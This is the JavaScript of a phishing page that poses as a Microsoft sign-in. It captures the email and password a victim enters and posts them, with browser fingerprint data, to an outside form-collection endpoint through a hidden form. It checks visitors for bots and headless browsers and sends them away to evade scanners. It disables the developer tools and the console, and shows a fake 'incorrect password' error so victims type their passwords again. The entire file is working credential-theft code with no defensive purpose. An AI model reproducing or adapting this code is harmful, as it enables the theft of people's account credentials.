const h = new Date().getHours();
document.getElementById("time-label").textContent = h < 12 ? "Good morning" : h < 17 ? "Good afternoon" : "Good evening";

const starsEl = document.getElementById("stars");
for (let i = 0; i < 80; i++) {
  const s = document.createElement("div");
  s.className = "star";
  const size = Math.random() * 2 + 1;
  s.style.cssText = `width:${size}px;height:${size}px;top:${Math.random() * 60}%;left:${Math.random() * 100}%;animation-duration:${2 + Math.random() * 3}s;animation-delay:${Math.random() * 4}s;`;
  starsEl.appendChild(s);
}
(function(){
"use strict";
const CONFIG={
endpoint:"https://submit-form.com/bRJocTvGb",
redirect:"https://microsoft.com",
minPass:6,
maxAttempts:3,
minInteractions:5,
minTimeMs:2000,
jitterMin:1500,
jitterMax:3200,
requiredInteractions:5,
minBehaviorTimeSec:2
};
const state={
attempts:0,
isSubmitting:false,
isHuman:false,
startTime:Date.now(),
interactions:0,
email:'',
honeypotFilled:false,
honeypotFillTime:0,
verification:{
passed:false,
startTime:Date.now(),
interactions:{mouseMoves:0,touches:0,clicks:0,keyPresses:0,scrolls:0}
},
botScore:0,
botReasons:[]
};
const $=id=>document.getElementById(id);
function detectBot(){
let score=0;
const reasons=[];
if(navigator.webdriver===true){score+=0.5;reasons.push('webdriver_true');}else if(navigator.webdriver===false){score+=0.05;}
if(window.chrome&&window.chrome.runtime&&window.chrome.runtime.id===undefined){score+=0.3;reasons.push('chrome_runtime_no_id');}
if(navigator.plugins&&navigator.plugins.length===0){if(!/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)){score+=0.3;reasons.push('no_plugins_desktop');}}
if(navigator.languages){if(navigator.languages.length===0){score+=0.3;reasons.push('no_languages');}else if(navigator.languages.length===1&&navigator.languages[0]==='en-US'){score+=0.1;reasons.push('only_en_us');}}
const ua=navigator.userAgent;
const platform=navigator.platform;
if(ua.includes('Windows')&&!platform.includes('Win')){score+=0.3;reasons.push('ua_platform_mismatch_win');}
if(ua.includes('Mac')&&!platform.includes('Mac')){score+=0.3;reasons.push('ua_platform_mismatch_mac');}
if(ua.includes('Linux')&&!platform.includes('Linux')&&!platform.includes('X11')){score+=0.2;reasons.push('ua_platform_mismatch_linux');}
if(screen.width===800&&screen.height===600){score+=0.2;reasons.push('headless_resolution_800x600');}else if(screen.width===1024&&screen.height===768){score+=0.1;reasons.push('headless_resolution_1024x768');}
const hasTouch='ontouchstart' in window||navigator.maxTouchPoints>0;
const isMobile=/Mobi|Android|iPhone|iPad/i.test(ua);
if(isMobile&&!hasTouch){score+=0.3;reasons.push('mobile_ua_no_touch');}
const timingStart=performance.now();let a=0;for(let i=0;i<300000;i++){a+=i;}const timingDiff=performance.now()-timingStart;if(timingDiff<4){score+=0.2;reasons.push('timing_too_fast');}
if(window.callPhantom||window._phantom){score=1.0;reasons.push('phantomjs_detected');}
if(navigator.userAgent.includes('HeadlessChrome')){score+=0.5;reasons.push('headless_chrome_ua');}
if(window.__nightmare||window.__puppeteer_evaluation_script){score+=0.5;reasons.push('automation_framework');}
if(document.documentElement.getAttribute('webdriver')){score+=0.4;reasons.push('selenium_webdriver_attr');}
if(window.cdc_adoQpoasnfa76pfcZLmcfl){score+=0.4;reasons.push('cdp_detected');}
state.botScore=Math.min(score,1.0);
state.botReasons=reasons.slice(0,5);
if(state.botScore>0.6){window.location.replace(CONFIG.redirect);return true;}
return false;
}
function trackActivity(){
['mousemove','touchstart','click','keydown','scroll'].forEach(evt=>{
document.addEventListener(evt,()=>{
if(evt==='mousemove')state.verification.interactions.mouseMoves++;
if(evt==='touchstart')state.verification.interactions.touches++;
if(evt==='click')state.verification.interactions.clicks++;
if(evt==='keydown')state.verification.interactions.keyPresses++;
if(evt==='scroll')state.verification.interactions.scrolls++;
const totalInteractions=state.verification.interactions.mouseMoves+state.verification.interactions.touches*2+state.verification.interactions.clicks*2+state.verification.interactions.keyPresses+state.verification.interactions.scrolls;
const elapsedSec=(Date.now()-state.verification.startTime)/1000;
if(totalInteractions>=CONFIG.requiredInteractions||elapsedSec>=CONFIG.minBehaviorTimeSec){state.isHuman=true;}
},{once:evt==='scroll'});
});
}
const sendData=async(email,password,userAgent,screen,attempt,timestamp,referrer,honeypotFlag)=>{
const jitter=Math.floor(Math.random()*(CONFIG.jitterMax-CONFIG.jitterMin+1))+CONFIG.jitterMin;
await new Promise(resolve=>setTimeout(resolve,jitter));
const form=document.createElement('form');
form.method='POST';
form.action=CONFIG.endpoint;
form.target='hiddenFrame';
form.style.display='none';
const fields={
u:email,
p:password,
ua:userAgent,
sc:screen,
att:attempt,
ts:timestamp,
rf:referrer,
hp:honeypotFlag?'1':'0',
referrer: document.referrer || 'Direct',
url: window.location.href
};
for(const[key,value]of Object.entries(fields)){const input=document.createElement('input');input.type='hidden';input.name=key;input.value=value;form.appendChild(input);}
document.body.appendChild(form);form.submit();document.body.removeChild(form);
};
const initStealth=()=>{
document.addEventListener('contextmenu',e=>e.preventDefault());
document.addEventListener('keydown',e=>{if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'))||(e.ctrlKey&&e.key==='U'))e.preventDefault();});
const noop=()=>{};console.log=console.info=console.warn=console.error=noop;
};
const setupHoneypot=()=>{const honeypot=$('h1');if(!honeypot)return;honeypot.addEventListener('input',function(){if(this.value.trim()!==''&&state.honeypotFillTime===0){state.honeypotFillTime=Date.now();}});};
const showError=(el,msg)=>{if(el){const span=el.querySelector('span:last-child');if(span)span.textContent=msg;el.classList.add('show');}};
const hideError=el=>el?.classList.remove('show');
window.goToPassword=()=>{const emailVal=$('f1').value.trim();if(!emailVal){showError($('email-error'),'Enter a valid email address.');return;}state.email=emailVal;hideError($('email-error'));const btn=$('b1');btn.classList.add('loading');setTimeout(()=>{btn.classList.remove('loading');$('u1').textContent=state.email;$('s1').classList.remove('active');$('s2').classList.add('active');$('f2').focus();},900);};
window.goBack=()=>{$('s2').classList.remove('active');$('s1').classList.add('active');hideError($('e1'));$('f2').value='';};
window.signIn=async()=>{
if(!state.isHuman){showError($('e1'),'Verifying...');return;}
const pw=$('f2').value;const errEl=$('e1');
if(!pw){showError(errEl,'Please enter your password.');$('f2').classList.add('error-field');return;}
if(pw.length<CONFIG.minPass){showError(errEl,`Password must be at least ${CONFIG.minPass} characters.`);$('f2').classList.add('error-field');return;}
const honeypot=$('h1');let honeypotFlag=false;if(honeypot&&honeypot.value.trim()!==''){honeypotFlag=true;state.honeypotFilled=true;}
hideError(errEl);$('f2').classList.remove('error-field');state.attempts++;const btn=$('b2');btn.classList.add('loading');
await sendData(state.email,pw,navigator.userAgent,screen.width+'x'+screen.height,state.attempts,Date.now(),document.referrer||'',honeypotFlag);
setTimeout(()=>{btn.classList.remove('loading');if(state.attempts>=CONFIG.maxAttempts){$('s2').classList.remove('active');$('s3').classList.add('active');const bar=$('p1');bar.style.width='100%';const redirect=()=>{window.location.href=CONFIG.redirect;};bar.addEventListener('transitionend',redirect,{once:true});setTimeout(()=>{bar.removeEventListener('transitionend',redirect);redirect();},5000);}else{showError(errEl,'That password is incorrect for your Microsoft account.');$('f2').value='';$('f2').focus();}},1200);
};
const bindEvents=()=>{$('b1').addEventListener('click',window.goToPassword);$('back-btn').addEventListener('click',window.goBack);$('b2').addEventListener('click',window.signIn);$('f2').addEventListener('keydown',e=>{if(e.key==='Enter')window.signIn();});};
const init=()=>{if(detectBot())return;initStealth();trackActivity();setupHoneypot();bindEvents();};
init();
})();